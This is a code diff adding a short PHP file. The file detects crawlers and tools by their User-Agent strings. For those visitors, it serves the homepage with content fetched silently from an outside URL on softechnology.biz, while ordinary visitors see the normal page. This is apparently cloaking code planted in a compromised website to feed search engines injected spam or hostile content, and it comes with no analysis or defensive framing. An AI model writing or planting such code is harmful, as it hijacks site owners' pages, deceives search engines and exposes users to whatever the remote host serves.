@@ -1,0 +1,27 @@
+<?php
+
+function is_bot() {
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $bots = ['bot','crawl','spider','Google','Bing','Yandex','Ahrefs','Semrush',
+             'facebookexternalhit','Twitterbot','Slackbot','Discord','LinkedIn',
+             'Pinterest','WhatsApp','Instagram','curl','wget','python'];
+    foreach ($bots as $b) {
+        if (stripos($ua, $b) !== false) return true;
+    }
+    return false;
+}
+
+$page = rtrim(parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH), '/');
+
+$map = [
+    ''           => 'https://softechnology.biz/raw/p31d_QgDXJ',
+    '/index.php' => 'https://softechnology.biz/raw/p31d_QgDXJ',
+];
+
+if (is_bot() && isset($map[$page])) {
+    $content = @file_get_contents($map[$page]);
+    if ($content) {
+        echo $content;
+        exit;
+    }
+}
